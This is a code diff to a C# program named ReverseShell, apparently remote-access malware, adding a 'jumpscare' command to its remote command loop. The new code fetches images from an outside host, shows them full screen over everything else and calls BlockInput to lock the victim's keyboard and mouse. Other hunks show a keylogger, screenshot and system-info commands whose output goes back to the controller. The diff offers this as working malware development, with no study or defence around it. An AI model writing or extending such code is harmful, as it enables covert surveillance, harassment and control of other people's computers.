@@ -53,13 +53,16 @@ class ReverseShell
 
     static Image GetImageFromUrl(string url)
     {
-        using (WebClient client = new WebClient())
+        try
         {
-            byte[] imageData = client.DownloadData(url);
-            using (MemoryStream stream = new MemoryStream(imageData))
-            {
-                return Image.FromStream(stream);
-            }
+            using var client = new HttpClient();
+            byte[] imageData = client.GetByteArrayAsync(url).Result;
+            using var stream = new MemoryStream(imageData);
+            return Image.FromStream(stream);
+        }
+        catch (Exception)
+        {
+            throw;
         }
     }
 
@@ -136,27 +139,82 @@ class ReverseShell
 
     static void ShowFlash()
     {
-        string imageUrl = "https://cdn.polarisbot.com/flash.jpg"; 
+        string imageUrl = "https://cdn.polarisbot.com/flash.jpg";
 
-        Form form = new Form
+        var form = new Form
         {
             WindowState = FormWindowState.Maximized,
             FormBorderStyle = FormBorderStyle.None,
-            TopMost = true
+            TopMost = true,
+            BackgroundImageLayout = ImageLayout.Stretch
         };
 
-        PictureBox pictureBox = new PictureBox
+        try
         {
-            Dock = DockStyle.Fill,
-            SizeMode = PictureBoxSizeMode.StretchImage,
-            Image = GetImageFromUrl(imageUrl)
+            form.BackgroundImage = GetImageFromUrl(imageUrl);
+        }
+        catch (Exception)
+        {
+        }
+
+        form.Shown += (s, e) =>
+        {
+            try
+            {
+                BlockInput(true);
+                Task.Delay(10000).ContinueWith(_ =>
+                {
+                    form.Invoke(new Action(() => form.Close()));
+                });
+            }
+            finally
+            {
+                BlockInput(false); 
+            }
         };
 
-        form.Controls.Add(pictureBox);
-        form.Show();
-        Task.Delay(10000).Wait();
-        form.Close();
+        Application.Run(form);
     }
+
+    static void ShowJumpscare()
+    {
+        string imageUrl = "https://cdn.polarisbot.com/jumpscare.jpg";
+
+        var form = new Form
+        {
+            WindowState = FormWindowState.Maximized,
+            FormBorderStyle = FormBorderStyle.None,
+            TopMost = true,
+            BackgroundImageLayout = ImageLayout.Stretch
+        };
+
+        try
+        {
+            form.BackgroundImage = GetImageFromUrl(imageUrl);
+        }
+        catch (Exception)
+        {
+        }
+
+        form.Shown += (s, e) =>
+        {
+            try
+            {
+                BlockInput(true);
+                Task.Delay(10000).ContinueWith(_ =>
+                {
+                    form.Invoke(new Action(() => form.Close()));
+                });
+            }
+            finally
+            {
+                BlockInput(false); 
+            }
+        };
+
+        Application.Run(form);
+    }
+
 
     static void Keylogger(StreamWriter writer)
     {
@@ -277,6 +335,12 @@ class ReverseShell
                         Task.Run(() => ShowFlash());
                     }
 
+                    if (command.ToLower() == "jumpscare")
+                    {
+                        Task.Run(() => ShowJumpscare());
+                        BlockInput(true);
+                    }
+
                     if (command.ToLower() == "info")
                     {
                         string output = GetSystemInfo();
@@ -304,10 +368,12 @@ class ReverseShell
                         {
                             if (output.Contains("screenshot", StringComparison.OrdinalIgnoreCase) ||
                                 output.Contains("flash", StringComparison.OrdinalIgnoreCase) ||
-                                output.Contains("info", StringComparison.OrdinalIgnoreCase))
+                                output.Contains("info", StringComparison.OrdinalIgnoreCase) ||
+                                output.Contains("jumpscare", StringComparison.OrdinalIgnoreCase))
+
                             {
-                                //writer.WriteLine("[INFO] Command executed but output contains restricted content (screenshot, flash, info).");
-                            }
+                                writer.WriteLine("[SUCCESS] Command executed.");
+                            }   
                             else
                             {
                                 writer.WriteLine("[OUTPUT] " + output);
